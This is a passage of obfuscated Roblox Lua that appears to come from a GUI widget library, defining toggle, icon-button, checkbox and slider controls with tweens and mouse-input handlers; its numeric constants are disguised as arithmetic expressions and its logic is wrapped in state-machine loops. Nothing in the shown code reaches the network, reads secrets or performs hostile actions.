			v1879.Position = UDim2.new(0 + 0, 0 + 0, 0.5 - 0, 843 - (268 + 575));
			v1879.ImageRectSize = Vector2.new(1694 - (919 + 375), 800);
			v1879.ImageRectOffset = Vector2.new(0 - 0, 971 - (180 + 791));
			v1879.Name = v1335 .. "LeftSide";
			v1882.Text = "";
			v1882.Name = v1335 .. "Hitbox";
			v1882.BorderSizePixel = 1805 - (323 + 1482);
			v1882.BackgroundTransparency = 1919 - (1177 + 741);
			v1882.Size = UDim2.new(1 + 0, 0 - 0, 1 + 0, 0 - 0);
			v1882.AnchorPoint = Vector2.new(0.5 + 0, 109.5 - (96 + 13));
			v1882.Position = UDim2.new(1921.5 - (962 + 959), 0 - 0, 0.5 + 0, 1351 - (461 + 890));
			v1882.ZIndex = 2 + 0;
			v1878.BorderSizePixel = 0 - 0;
			v1878.AnchorPoint = Vector2.new(243.5 - (19 + 224), 0.5 + 0);
			v1878.Position = UDim2.new(0.5, 0, 198.5 - (37 + 161), 0 + 0);
			v1878.Name = v1335 .. "Bar";
			v1881.Name = v1335 .. "Markup";
			v1881.BorderSizePixel = 1;
			v1881.BackgroundTransparency = 1 + 0;
			v1881.Image = v1876.MarkupImage;
			local v1917 = false;
			local v1918 = true;
			v1882.MouseEnter:Connect(function()
				v1917 = true;
			end);
			v1882.MouseLeave:Connect(function()
				v1917 = false;
			end);
			v1882.MouseButton1Down:Connect(function()
				local v2511 = 0 + 0;
				while true do
					if (v2511 == (61 - (60 + 1))) then
						v1918 = true;
						if v1876.Enabled then
							local v3398 = 923 - (826 + 97);
							local v3399;
							local v3400;
							local v3401;
							local v3402;
							local v3403;
							while true do
								if (v3398 == (0 + 0)) then
									v3399 = nil;
									if v1876.Value then
										v3399 = v1876.BarOnlineColor3;
									else
										v3399 = v1876.BarOfflineColor3;
									end
									v3398 = 1;
								end
								if (2 == v3398) then
									v3399 = Color3.fromHSV(v3400, v3401, v3402);
									v1338:Create(v1877, v1876.TogleTweenInfo, {BackgroundColor3=v3399}):Play();
									v3398 = 10 - 7;
								end
								if (v3398 == (5 - 2)) then
									v3403 = nil;
									v3403 = v1337.InputEnded:Connect(function(v3548)
										if (v3548.UserInputType == Enum.UserInputType.MouseButton1) then
											local v3572 = 685 - (375 + 310);
											while true do
												if (v3572 == (1999 - (1864 + 135))) then
													v3403:Disconnect();
													if (v1876.Enabled and v1917) then
														v1876.Toggle(v1872);
													else
														v1876.RestoreBackground(v1872);
													end
													break;
												end
											end
										end
									end);
									break;
								end
								if (v3398 == (2 - 1)) then
									v3400, v3401, v3402 = v3399:ToHSV();
									v3402 = v3402 - ((v1876.ClickDarkness / 100) * v3402);
									v3398 = 1 + 1;
								end
							end
						end
						break;
					end
				end
			end);
			v1877.Changed:Connect(function(v2512)
				if (v2512 == "BackgroundColor3") then
					v1879.ImageColor3 = v1877.BackgroundColor3;
					v1880.ImageColor3 = v1877.BackgroundColor3;
					v1878.BackgroundColor3 = v1877.BackgroundColor3;
				end
			end);
			v1875.__Instance = v1877;
			v1875.__Base2D = v1877;
			v1875.__CHitbox = v1882;
			v1875.__Background = v1877;
			v1875.Bar = v1878;
			v1875.RightSide = v1880;
			v1875.LeftSide = v1879;
			v1875.Markup = v1881;
			v1876.Redraw(v1872);
			v1876.Toggle(v1872, v1876.Value);
		end, function(v1927)
			local v1928 = 0 + 0;
			while true do
				if (v1928 == (0 - 0)) then
					v1927['BarOnlineColor3'] = function(v3152, v3153)
						local v3154 = 1131 - (314 + 817);
						local v3155;
						while true do
							if (v3154 == (0 + 0)) then
								if v3152.MainColorTween then
									v3152.MainColorTween:Cancel();
								end
								v3155 = nil;
								v3154 = 215 - (32 + 182);
							end
							if (v3154 == 1) then
								if v3153.Value then
									v3155 = v3153.BarOnlineColor3;
								else
									v3155 = v3153.BarOfflineColor3;
								end
								v3152.__Instance.BackgroundColor3 = v3155;
								break;
							end
						end
					end;
					v1927['BarOfflineColor3'] = v1927['BarOnlineColor3'];
					v1927['BarTransparency'] = function(v3156, v3157)
						local v3158 = 0;
						while true do
							if (v3158 == (1 + 0)) then
								v3156.RightSide.ImageTransparency = v3157.BarTransparency;
								break;
							end
							if (0 == v3158) then
								v3156.Bar.BackgroundTransparency = v3157.BarTransparency;
								v3156.LeftSide.ImageTransparency = v3157.BarTransparency;
								v3158 = 3 - 2;
							end
						end
					end;
					v1928 = 66 - (39 + 26);
				end
				if (v1928 == (147 - (54 + 90))) then
					v1927['MarkupImage'] = v1927['SliderType'];
					v1927['BarThickness'] = function(v3159, v3160)
						local v3161 = 198 - (45 + 153);
						local v3162;
						while true do
							if (v3161 == (0 + 0)) then
								v3159.__Instance.Size = UDim2.new(552 - (457 + 95), v3160.Size.X, 0, v3160.Size.Y);
								v3159.LeftSide.Size = UDim2.new(0 + 0, v3160.BarThickness / 2, 1, 0 - 0);
								v3161 = 2 - 1;
							end
							if ((7 - 5) == v3161) then
								v3162 = math.min(v3159.Bar.AbsoluteSize.X, v3159.Bar.AbsoluteSize.Y) * v3160.MarkupSize;
								v3159.Markup.Size = UDim2.new(0, v3162, 0 + 0, v3162);
								break;
							end
							if (1 == v3161) then
								v3159.RightSide.Size = UDim2.new(0 - 0, v3160.BarThickness / 2, 1, 0);
								v3159.Bar.Size = UDim2.new(2 - 1, -v3160.BarThickness, 749 - (485 + 263), 707 - (575 + 132));
								v3161 = 863 - (750 + 111);
							end
						end
					end;
					v1927['Size'] = v1927['BarThickness'];
					break;
				end
				if ((1011 - (445 + 565)) == v1928) then
					v1927['MarkupSize'] = function(v3163, v3164)
						v3163.Markup.ImageTransparency = v3164.MarkupTransparency;
						v3163.Markup.Size = UDim2.new(0, v3164.MarkupSize, 0, v3164.MarkupSize);
						v3163.Markup.ImageColor3 = v3164.MarkupColor3;
					end;
					v1927['MarkupColor3'] = v1927['MarkupSize'];
					v1927['MarkupDistance'] = v1927['MarkupSize'];
					v1928 = 2 + 0;
				end
				if (2 == v1928) then
					v1927['MarkupTransparency'] = v1927['MarkupSize'];
					v1927['SliderType'] = function(v3170, v3171)
						local v3172 = 0 + 0;
						local v3173;
						while true do
							if (v3172 == (0 - 0)) then
								v3173 = v3171.SliderType.Value;
								if (v3173 == "") then
									local v3523 = 0 + 0;
									while true do
										if ((311 - (189 + 121)) == v3523) then
											v3170.Markup.Image = v3171.MarkupImage;
											break;
										end
										if (v3523 == (0 + 0)) then
											v3170.LeftSide.Image = v3171.SideSheet;
											v3170.RightSide.Image = v3171.SideSheet;
											v3523 = 1;
										end
									end
								else
									v3170.LeftSide.Image = v3173;
									v3170.RightSide.Image = v3173;
									v3170.Markup.Image = v3173;
								end
								break;
							end
						end
					end;
					v1927['SlideSheet'] = v1927['SliderType'];
					v1928 = 1350 - (634 + 713);
				end
			end
		end, {RestoreBackground=function(v1929)
			local v1930 = 0;
			local v1931;
			local v1932;
			local v1933;
			while true do
				if (v1930 == 0) then
					v1931 = v1334(v1929);
					v1932 = v1931.__Fields;
					v1930 = 539 - (493 + 45);
				end
				if (v1930 == 2) then
					v1338:Create(v1931.__Instance, v1932.TogleTweenInfo, {BackgroundColor3=v1933}):Play();
					break;
				end
				if (v1930 == (969 - (493 + 475))) then
					v1933 = nil;
					if v1932.Value then
						v1933 = v1932.BarOnlineColor3;
					else
						v1933 = v1932.BarOfflineColor3;
					end
					v1930 = 2;
				end
			end
		end,Toggle=function(v1934, v1935)
			local v1936 = v1334(v1934);
			local v1937 = v1936.ValueChanged;
			local v1938 = v1936.__Instance;
			local v1939 = v1936.Markup;
			local v1940 = v1936.__Fields;
			local v1941 = v1940.MarkupDistance;
			local v1942 = v1940.BarOnlineColor3;
			local v1943 = v1940.BarOfflineColor3;
			if (type(v1935) ~= "boolean") then
				v1935 = not v1940.Value;
			end
			if (v1935 == false) then
				v1338:Create(v1939, v1940.TogleTweenInfo, {Position=UDim2.new(0, v1941 - (v1940.BarThickness / (1 + 1)), 784.5 - (158 + 626), 0),AnchorPoint=Vector2.new(0 + 0, 0.5 - 0)}):Play();
				v1936.MainColorTween = v1338:Create(v1938, v1940.TogleTweenInfo, {BackgroundColor3=v1943});
				v1936.MainColorTween:Play();
				v1940.Value = false;
			elseif (v1935 == true) then
				local v3174 = 0;
				while true do
					if (v3174 == 1) then
						v1936.MainColorTween:Play();
						v1940.Value = true;
						break;
					end
					if (v3174 == (0 + 0)) then
						v1338:Create(v1939, v1940.TogleTweenInfo, {Position=UDim2.new(1 + 0, (v1940.BarThickness / (1093 - (1035 + 56))) - v1941, 959.5 - (114 + 845), 0 + 0),AnchorPoint=Vector2.new(1, 0.5)}):Play();
						v1936.MainColorTween = v1338:Create(v1938, v1940.TogleTweenInfo, {BackgroundColor3=v1942});
						v3174 = 2 - 1;
					end
				end
			end
			v1937:Fire(v1940.Value);
		end});
		v1363("ButtonIcon", {Size={"\4\0\0UDim2",UDim2.new(1049 - (179 + 870), 35 - 10, 0, 25)},IconSize={"\3\0\0number",13},IconRotation={"\3\0\0number",(0 + 0)},HoverSize={"\3\0\0number",2},Clicked={"\4\0\1Event"}}, {}, function(v1944, v1945)
			local v1946 = 0;
			local v1947;
			local v1948;
			local v1949;
			local v1950;
			local v1951;
			local v1952;
			local v1953;
			local v1954;
			local v1955;
			local v1956;
			local v1957;
			while true do
				if (v1946 == 0) then
					v1947 = v1334(v1944);
					v1948 = v1947.__Fields;
					v1949 = Instance.new("Frame", v1366(v1945));
					v1950 = Instance.new("UICorner", v1949);
					v1951 = Instance.new("ImageLabel", v1949);
					v1946 = 1 + 0;
				end
				if (v1946 == (9 - 2)) then
					v1948.Redraw(v1944);
					break;
				end
				if (v1946 == (1 + 0)) then
					v1952 = Instance.new("TextButton", v1949);
					v1949.Name = v1335 .. "ButtonIcon";
					v1949.BackgroundColor3 = v1358.DimMidnightBlue;
					v1949.Size = UDim2.new(0, 1036 - (334 + 677), 0, 93 - 68);
					v1949.AnchorPoint = Vector2.new(1056.5 - (1049 + 7), 0.5 - 0);
					v1946 = 2;
				end
				if (v1946 == 2) then
					v1950.CornerRadius = UDim.new(1 - 0, 0);
					v1951.BackgroundTransparency = 1 + 0;
					v1951.Image = "rbxassetid://3754291346";
					v1951.AnchorPoint = Vector2.new(0.5 - 0, 0.5);
					v1951.Position = UDim2.new(0.5 - 0, 0 + 0, 0.5, 1420 - (1004 + 416));
					v1946 = 1960 - (1621 + 336);
				end
				if (v1946 == (1945 - (337 + 1602))) then
					v1947.__Instance = v1949;
					v1947.__Base2D = v1949;
					v1947.__Background = v1949;
					v1947.__UICorner = v1950;
					v1947.__ImageRender = v1951;
					v1946 = 1524 - (1014 + 503);
				end
				if (v1946 == 5) then
					v1952.MouseEnter:Connect(v1955);
					v1952.MouseLeave:Connect(function()
						v1953 = false;
						v1954();
					end);
					v1956 = nil;
					function v1957(v3175)
						if (v3175.UserInputType == Enum.UserInputType.MouseButton1) then
							if v1953 then
								v1947.Clicked:Fire();
							end
							v1955();
							v1956:Disconnect();
						end
					end
					v1952.MouseButton1Down:Connect(function()
						v1954();
						v1956 = v1337.InputEnded:Connect(v1957);
					end);
					v1946 = 1021 - (446 + 569);
				end
				if (v1946 == (1 + 2)) then
					v1951.ImageColor3 = v1358.Cloud;
					v1952.Text = "";
					v1952.BackgroundTransparency = 2 - 1;
					v1952.Size = UDim2.new(1, 0 + 0, 1 - 0, 0 + 0);
					v1952.AnchorPoint = Vector2.new(0.5, 505.5 - (223 + 282));
					v1946 = 4;
				end
				if (v1946 == 4) then
					v1952.Position = UDim2.new(0.5 + 0, 0 - 0, 0.5 - 0, 0);
					v1953 = false;
					v1954 = nil;
					function v1954()
						local v3176 = 670 - (623 + 47);
						while true do
							if (v3176 == (45 - (32 + 13))) then
								v1949.Size = v1948.Size;
								v1951.Size = UDim2.new(0 + 0, v1948.IconSize, 0 + 0, v1948.IconSize);
								break;
							end
						end
					end
					function v1955()
						local v3177 = 1801 - (1070 + 731);
						local v3178;
						while true do
							if (v3177 == 0) then
								v1953 = true;
								v3178 = UDim2.new(0 + 0, v1948.HoverSize, 1404 - (1257 + 147), v1948.HoverSize);
								v3177 = 1;
							end
							if (v3177 == (1 + 0)) then
								v1949.Size = v1948.Size + v3178;
								v1951.Size = v1951.Size + v3178;
								break;
							end
						end
					end
					v1946 = 9 - 4;
				end
			end
		end, function(v1958)
			local v1959 = 0;
			while true do
				if (v1959 == 1) then
					v1958['IconRotation'] = function(v3179, v3180)
						v3179.__ImageRender.Rotation = v3180.IconRotation;
					end;
					break;
				end
				if (v1959 == 0) then
					v1958['Size'] = function(v3183, v3184)
						v3183.__Instance.Size = v3184.Size;
					end;
					v1958['IconSize'] = function(v3187, v3188)
						v3187.__ImageRender.Size = UDim2.new(133 - (98 + 35), v3188.IconSize, 0, v3188.IconSize);
					end;
					v1959 = 1 + 0;
				end
			end
		end, {});
		v1363("CheckBox", {Checked={"\3\0\0boolean",false},Size={"\3\0\0number",17},StartBoxColor3={"\4\0\0Color3",v1361.SecondaryColor},EndBoxColor3={"\4\0\0Color3",v1361.SecondaryColor},StartBoxTransparency={"\3\0\0number",(0 + 0)},EndBoxTransparency={"\3\0\0number",(1941 - (816 + 1125))},CheckBoxType={"\0\0\0CheckBoxType",v1355.CheckBoxType.Smooth},CheckBoxImage={"\3\0\0string",""},CheckBoxFill={"\3\0\0boolean",true},CheckImage={"\3\0\0string",""},StartCheckColor3={"\4\0\0Color3",v1361.HighlightColor},EndCheckColor3={"\4\0\0Color3",v1361.HighlightColor},StartCheckTransparency={"\3\0\0number",(1 + 0)},EndCheckTransparency={"\3\0\0number",0},StartCheckSize={"\3\0\0number",(0 - 0)},EndCheckSize={"\3\0\0number",(1259.5 - (1147 + 112))},MetroStyle={"\3\0\0boolean",true},MetroTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.15, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)},CheckChanged={"\4\0\1Event"}}, {}, function(v1960, v1961)
			local v1962 = v1334(v1960);
			local v1963 = v1962.__Fields;
			local v1964 = Instance.new("Frame", v1366(v1961));
			local v1965 = Instance.new("ImageLabel", v1964);
			local v1966 = Instance.new("ImageLabel", v1965);
			local v1967 = Instance.new("TextButton", v1964);
			v1964.BackgroundTransparency = 1;
			v1964.BorderSizePixel = 0;
			v1964.Name = "VeraniumCheckBox";
			v1964.ZIndex = v1361.ZIndex;
			v1964.Size = UDim2.new(697 - (335 + 362), 17, 0, 16 + 1);
			v1965.BackgroundTransparency = 1 - 0;
			v1965.BorderSizePixel = 0 - 0;
			v1965.Size = UDim2.new(3 - 2, 0 - 0, 2 - 1, 0);
			v1965.Position = UDim2.new(566.5 - (237 + 329), 0, 0.5 - 0, 0 + 0);
			v1965.AnchorPoint = Vector2.new(0.5 + 0, 1124.5 - (408 + 716));
			v1965.Name = v1335 .. "Box";
			v1966.BackgroundTransparency = 3 - 2;
			v1966.BorderSizePixel = 821 - (344 + 477);
			v1966.Position = UDim2.new(0.5 + 0, 1761 - (1188 + 573), 0.5 - 0, 0);
			v1966.AnchorPoint = Vector2.new(0.5, 0.5 + 0);
			v1966.Name = v1335 .. "CheckMark";
			v1967.BackgroundTransparency = 1;
			v1967.Text = "";
			v1967.AnchorPoint = Vector2.new(0.5, 0.5);
			v1967.Position = UDim2.new(0.5 - 0, 0 - 0, 0.5 - 0, 0);
			v1967.Size = UDim2.new(1530 - (508 + 1021), 5 + 0, 1167 - (228 + 938), 690 - (332 + 353));
			v1967.Name = v1335 .. "Hitbox";
			v1967.MouseButton1Down:Connect(function()
				local v2513 = 0 - 0;
				while true do
					if (v2513 == (2 - 1)) then
						v1960:Check();
						break;
					end
					if (v2513 == 0) then
						v1963.Checked = not v1963.Checked;
						v1962.CheckChanged:Fire(true);
						v2513 = 1 + 0;
					end
				end
			end);
			v1962.__Instance = v1964;
			v1962.__Base2D = v1964;
			v1962.Box = v1965;
			v1962.Check = v1966;
			v1962.Hitbox = v1967;
			v1963.Check(v1960, false);
			v1963.Redraw(v1960);
		end, function(v1996)
			v1996['Size'] = function(v2514, v2515)
				v2514.__Instance.Size = UDim2.new(0 + 0, v2515.Size, 0, v2515.Size);
			end;
			v1996['Checked'] = function(v2517, v2518)
				local v2519 = 0 - 0;
				while true do
					if (v2519 == (423 - (18 + 405))) then
						v2517.CheckChanged:Fire(false);
						v2518.Check(v2517.__Proxy, false);
						break;
					end
				end
			end;
			v1996['StartBoxColor3'] = function(v2520, v2521)
				v2521.Check(v2520.__Proxy, false);
			end;
			v1996['EndBoxColor3'] = v1996['StartBoxColor3'];
			v1996['StartBoxTransparency'] = v1996['StartBoxColor3'];
			v1996['EndBoxTransparency'] = v1996['StartBoxColor3'];
			v1996['StartCheckColor3'] = v1996['StartBoxColor3'];
			v1996['EndCheckColor3'] = v1996['StartBoxColor3'];
			v1996['StartCheckTransparency'] = v1996['StartBoxColor3'];
			v1996['EndCheckTransparency'] = v1996['StartBoxColor3'];
			v1996['StartCheckSize'] = v1996['StartBoxColor3'];
			v1996['EndCheckSize'] = v1996['StartBoxColor3'];
			v1996['CheckBoxType'] = function(v2522, v2523)
				local v2524 = 0 + 0;
				local v2525;
				local v2526;
				local v2527;
				while true do
					if (v2524 == (2 + 0)) then
						if (v2523.CheckImage == "") then
							local v3404 = 0;
							while true do
								if (v3404 == 0) then
									v2527.Image = "rbxassetid://4018402187";
									v2527.ImageRectSize = Vector2.new(100, 100);
									v3404 = 1 - 0;
								end
								if (1 == v3404) then
									if (v2525 == (982 - (194 + 784))) then
										v2527.ImageRectOffset = Vector2.new(1770 - (694 + 1076), 100);
									else
										v2527.ImageRectOffset = Vector2.new(v2525 * (2004 - (122 + 1782)), 100);
									end
									break;
								end
							end
						else
							v2527.Image = v2523.CheckImage;
							v2527.ImageRectSize = Vector2.new(0 + 0, 0 + 0);
							v2527.ImageRectOffset = Vector2.new(0 + 0, 0 + 0);
						end
						break;
					end
					if (v2524 == (2 - 1)) then
						v2527 = v2522.Check;
						if (v2525 == 4) then
							local v3409 = 0 + 0;
							while true do
								if (v3409 == (1971 - (214 + 1756))) then
									v2526.ImageRectOffset = Vector2.new(0 - 0, 0 + 0);
									break;
								end
								if (v3409 == (0 + 0)) then
									v2526.Image = v2523.CheckBoxImage;
									v2526.ImageRectSize = Vector2.new(0, 585 - (217 + 368));
									v3409 = 2 - 1;
								end
							end
						else
							local v3410 = 0 + 0;
							while true do
								if (v3410 == (1 + 0)) then
									if v2523.CheckBoxFill then
										v2526.ImageRectOffset = Vector2.new(v2525 * (4 + 96), 100);
									else
										v2526.ImageRectOffset = Vector2.new(v2525 * (989 - (844 + 45)), 284 - (242 + 42));
									end
									break;
								end
								if (0 == v3410) then
									v2526.Image = "rbxassetid://4018402187";
									v2526.ImageRectSize = Vector2.new(200 - 100, 232 - 132);
									v3410 = 1201 - (132 + 1068);
								end
							end
						end
						v2524 = 2 - 0;
					end
					if (v2524 == (1623 - (214 + 1409))) then
						v2525 = v2523.CheckBoxType.Value;
						v2526 = v2522.Box;
						v2524 = 1;
					end
				end
			end;
			v1996['CheckBoxType'] = v1996['CheckBoxType'];
			v1996['CheckImage'] = v1996['CheckBoxType'];
			v1996['CheckBoxImage'] = v1996['CheckBoxType'];
			v1996['CheckBoxFill'] = v1996['CheckBoxType'];
		end, {CreateLabel=function(v2013, v2014)
			local v2015 = v1334(v2013);
			local v2016 = v2015.___Instance;
			local v2017 = Instance.new("TextLabel", v2016);
			v2017.Text = v2014;
			v2017.Name = v1335 .. "Label";
			v2017.BackgroundTransparency = 1;
			v2017.BorderSizePixel = 0 + 0;
			v2017.Font = v1361.Font;
			v2017.TextColor3 = v1361.TextColor;
			v2017.TextTransparency = v1361.TextTransparency;
			v2017.TextYAlignment = Enum.TextYAlignment.Center;
			v2017.Size = UDim2.new(0, 0, 1635 - (497 + 1137), 940 - (9 + 931));
			v2015.___TextRender = v2017;
			v2015.Draw['Label'](v2015, v2015.__Fields);
		end,Check=function(v2032, v2033)
			local v2034 = 289 - (181 + 108);
			local v2035;
			local v2036;
			local v2037;
			local v2038;
			local v2039;
			local v2040;
			local v2041;
			while true do
				if (v2034 == 4) then
					if v2033 then
						v1338:Create(v2038, v2037.MetroTweenInfo, {ImageColor3=v2040.ImageColor3,ImageTransparency=v2040.ImageTransparency}):Play();
						v1338:Create(v2039, v2037.MetroTweenInfo, {ImageColor3=v2041.ImageColor3,ImageTransparency=v2041.ImageTransparency,Size=v2041.Size}):Play();
					else
						v2038.ImageColor3 = v2040.ImageColor3;
						v2038.ImageTransparency = v2040.ImageTransparency;
						v2039.ImageColor3 = v2041.ImageColor3;
						v2039.ImageTransparency = v2041.ImageTransparency;
						v2039.Size = v2041.Size;
					end
					break;
				end
				if (v2034 == (2 + 0)) then
					v2038 = v2035.Box;
					v2039 = v2035.Check;
					v2034 = 7 - 4;
				end
				if (v2034 == (2 - 1)) then
					v2037 = v2035.__Fields;
					if (v2033 == nil) then
						v2033 = v2037.MetroStyle;
					end
					v2034 = 1 + 1;
				end
				if (v2034 == (0 + 0)) then
					v2035 = v1334(v2032);
					v2036 = v2035.__Instance;
					v2034 = 477 - (296 + 180);
				end
				if ((1406 - (1183 + 220)) == v2034) then
					v2040, v2041 = nil;
					if not v2037.Checked then
						local v3308 = 1265 - (1037 + 228);
						while true do
							if (v3308 == (0 - 0)) then
								v2040 = {ImageColor3=v2037.StartBoxColor3,ImageTransparency=v2037.StartBoxTransparency};
								v2041 = {ImageColor3=v2037.StartCheckColor3,ImageTransparency=v2037.StartCheckTransparency,Size=UDim2.new(v2037.StartCheckSize, 0, v2037.StartCheckSize, 0 - 0)};
								break;
							end
						end
					else
						v2040 = {ImageColor3=v2037.EndBoxColor3,ImageTransparency=v2037.EndBoxTransparency};
						v2041 = {ImageColor3=v2037.EndCheckColor3,ImageTransparency=v2037.EndCheckTransparency,Size=UDim2.new(v2037.EndCheckSize, 0, v2037.EndCheckSize, 0)};
					end
					v2034 = 4;
				end
			end
		end});
		v1363("Slider", {MinValue={"\3\0\0number",0},MaxValue={"\3\0\0number",(2 - 1)},Value={"\3\0\0number",0.5},IsDragging={"\3\0\1boolean",false},Step={"\3\0\0number",0.01},Size={"\4\0\0Vector2",Vector2.new(0 - 0, 100)},MetroStyle={"\3\0\0boolean",true},MetroTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.25 - 0, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)},SideSheet={"\3\0\0string",""},MarkupImage={"\3\0\0string","rbxassetid://3457843087"},BarColor3={"\4\0\0Color3",v1361.SecondaryColor},BarTransparency={"\3\0\0number",(0 + 0)},BarThickness={"\3\0\0number",10},MarkupColor3={"\4\0\0Color3",v1361.HighlightColor},MarkupTransparency={"\3\0\0number",0},MarkupSize={"\3\0\0number",(0.6 + 0)},DragEnd={"\4\0\1Event"},DragStart={"\4\0\1Event"},ValueChanged={"\4\0\1Event"}}, {}, function(v2042, v2043)
			local v2044 = v1334(v2042);
			local v2045 = v2044.__Fields;
			local v2046 = {};
			local v2047 = Instance.new("Frame", v1366(v2043));
			local v2048 = Instance.new("ImageLabel", v2047);
			local v2049 = Instance.new("TextButton", v2047);
			v2047.BackgroundTransparency = 1;
			v2047.BorderSizePixel = 0;
			v2047.Name = "MagnoliaSlider";
			v2047.ZIndex = v1361.ZIndex;
			Instance.new("UICorner", v2047);
			v2048.BackgroundTransparency = 1;
			v2048.BorderSizePixel = 0 - 0;
			v2048.AnchorPoint = Vector2.new(166.5 - (90 + 76), 0.5 - 0);
			v2048.Name = v1335 .. "Markup";
			v2049.Text = "";
			v2049.TextTransparency = 1 + 0;
			v2049.BackgroundTransparency = 1;
			v2049.BorderSizePixel = 0;
			v2049.AnchorPoint = Vector2.new(0.5 + 0, 0.5 + 0);
			v2049.Position = UDim2.new(0.5 - 0, 260 - (197 + 63), 0.5 + 0, 0 + 0);
			v2049.Size = UDim2.new(1 + 0, 1 + 4, 1 - 0, 1374 - (618 + 751));
			v2049.Name = v1335 .. "Hitbox";
			local v2067 = false;
			local function v2068()
				if v2067 then
					local v2971 = 0 + 0;
					local v2972;
					while true do
						if (v2971 == (1912 - (206 + 1704))) then
							v2044.ValueChanged:Fire(v2045.Value);
							break;
						end
						if (v2971 == 0) then
							v2972 = nil;
							if (v2047.Rotation == -(151 - 61)) then
								local v3489 = 0 - 0;
								while true do
									if (v3489 == (0 + 0)) then
										v2972 = v1351.Y - ((v2047.AbsolutePosition.Y - (v2047.AbsoluteSize.X / (1277 - (155 + 1120)))) + (1509.5 - (396 + 1110)));
										v2045.Value = v1359.Map(v2972, v2047.AbsoluteSize.X, 0 - 0, v2045.MinValue, v2045.MaxValue);
										break;
									end
								end
							else
								v2972 = v1351.X - v2047.AbsolutePosition.X;
								v2045.Value = v1359.Map(v2972, 0 + 0, v2047.AbsoluteSize.X, v2045.MinValue, v2045.MaxValue);
							end
							v2971 = 1 + 0;
						end
						if (v2971 == 1) then
							if (v2045.Value > v2045.MaxValue) then
								v2045.Value = v2045.MaxValue;
							elseif (v2045.Value < v2045.MinValue) then
								v2045.Value = v2045.MinValue;
							end
							if (v2045.Step ~= (0 + 0)) then
								v2045.Value = v1359.Round(v2045.Value / v2045.Step) * v2045.Step;
							end
							v2971 = 978 - (230 + 746);
						end
					end
				end
				if v2045.MetroStyle then
					local v2973 = v2048.AbsoluteSize.X / (603 - (473 + 128));
					local v2974 = v1359.Map(v2045.Value, v2045.MinValue, v2045.MaxValue, v2973 + 2, (v2047.AbsoluteSize.X - v2973) - (50 - (39 + 9)));
					v1338:Create(v2048, v2045.MetroTweenInfo, {Position=UDim2.new(0, v2974, 266.5 - (38 + 228), 0)}):Play();
				else
					v2042:RelocateMarkup();
				end
			end
			v2049.MouseButton1Down:Connect(function()
				local v2528 = 0 - 0;
				while true do
					if ((473 - (106 + 367)) == v2528) then
						v2067 = true;
						v2045.IsDragging = v2067;
						v2528 = 1;
					end
					if (1 == v2528) then
						v2044.DragStart:Fire();
						v2068();
						break;
					end
				end
			end);
			v2046[0 + 0] = v1337.InputEnded:Connect(function(v2529)
				if ((v2529.UserInputType == Enum.UserInputType.MouseButton1) and v2067) then
					v2067 = false;
					v2045.IsDragging = v2067;
					v2044.DragEnd:Fire();
				end
			end);
			v2046[1863 - (354 + 1508)] = v1351.Move:Connect(v2068);
			v2049.MouseMoved:Connect(function(v2530)
			end);
			v2044.__Instance = v2047;
			v2044.__Base2D = v2047;
			v2044.__Background = v2047;
			v2044.__Connection = v2046;
			v2044.Markup = v2048;
			v2044.Hitbox = v2049;
			v2045.Redraw(v2042);
		end, function(v2077)
			v2077['MarkupImage'] = function(v2531, v2532)
				v2531.Markup.Image = v2532.MarkupImage;
			end;
			v2077['BarColor3'] = function(v2535, v2536)
				v2535.__Instance.BackgroundColor3 = v2536.BarColor3;
			end;
			v2077['BarTransparency'] = function(v2539, v2540)
				v2539.__Instance.BackgroundTransparency = v2540.BarTransparency;
			end;
			v2077['BarThickness'] = function(v2543, v2544)
				v2543.__Instance.Size = UDim2.new(v2544.Size.X, v2544.Size.Y, 0 - 0, v2544.BarThickness);
				local v2546 = math.min(v2543.__Instance.AbsoluteSize.X, v2543.__Instance.AbsoluteSize.Y) * v2544.MarkupSize;
				v2543.Markup.Size = UDim2.new(0 + 0, v2546, 0, v2546);
			end;
			v2077['Size'] = v2077['BarThickness'];
			v2077['MarkupColor3'] = function(v2548, v2549)
				v2548.Markup.ImageColor3 = v2549.MarkupColor3;
			end;
			v2077['MarkupTransparency'] = function(v2552, v2553)
				v2552.Markup.ImageTransparency = v2553.MarkupTransparency;
			end;
			v2077['REDRAW'] = function(v2556, v2557)
				v2557.RelocateMarkup(v2556.__Proxy);
			end;
			v2077['Value'] = function(v2558, v2559)
				local v2560 = 0 + 0;
				while true do
					if (v2560 == (0 - 0)) then
						v2559.RelocateMarkup(v2558.__Proxy);
						v2558.ValueChanged:Fire(v2559.Value);
						break;
					end
				end
			end;
		end, {RelocateMarkup=function(v2087)
			local v2088 = v1334(v2087);
			local v2089 = v2088.__Fields;
			local v2090 = v2088.Markup;
			if (v2089.Step ~= (1244 - (334 + 910))) then
				v2089.Value = v1359.Round(v2089.Value / v2089.Step) * v2089.Step;
			end
			if (v2089.Value > v2089.MaxValue) then
				v2089.Value = v2089.MaxValue;
			end
			if (v2089.Value < v2089.MinValue) then
				v2089.Value = v2089.MinValue;
			end
			v2090.Position = UDim2.new(v1359.Map(v2089.Value, v2089.MinValue, v2089.MaxValue, 895 - (92 + 803), 1 + 0), 1181 - (1035 + 146), 616.5 - (230 + 386), 0 + 0);
		end});
		v1363("FillBox", {Checked={"\3\0\0boolean",false},Protected={"\3\0\0boolean",false},Size={"\3\0\0number",20},LeftLabel={"\3\0\0boolean",false},LabelPadding={"\3\0\0number",(1214 - (615 + 597))},StartBoxColor3={"\4\0\0Color3",v1358.Midnight},EndBoxColor3={"\4\0\0Color3",v1358.ElectricBlue},StartBoxTransparency={"\3\0\0number",0},EndBoxTransparency={"\3\0\0number",(0 - 0)},FillBoxType={"\0\0\0FillBoxType",v1355.FillBoxType.Smooth},CheckChanged={"\4\0\1Event"}}, {Value="Checked",ValueChanged="CheckChanged"}, function(v2092, v2093)
			local v2094 = 0 + 0;
			local v2095;
			local v2096;
			local v2097;
			local v2098;
			local v2099;
			while true do
				if (v2094 == (1976 - (286 + 1690))) then
					v2095 = v1334(v2092);
					v2096 = v2095.__Fields;
					v2097 = v2095.__ChangeSignal;
					v2094 = 912 - (98 + 813);
				end
				if (v2094 == (1 + 0)) then
					v2098 = Instance.new("Frame", v1366(v2093));
					v2099 = Instance.new("ImageButton", v2098);
					v2098.BackgroundTransparency = 1;
					v2094 = 4 - 2;
				end
				if (v2094 == (4 + 3)) then
					v2095.__Base2D = v2098;
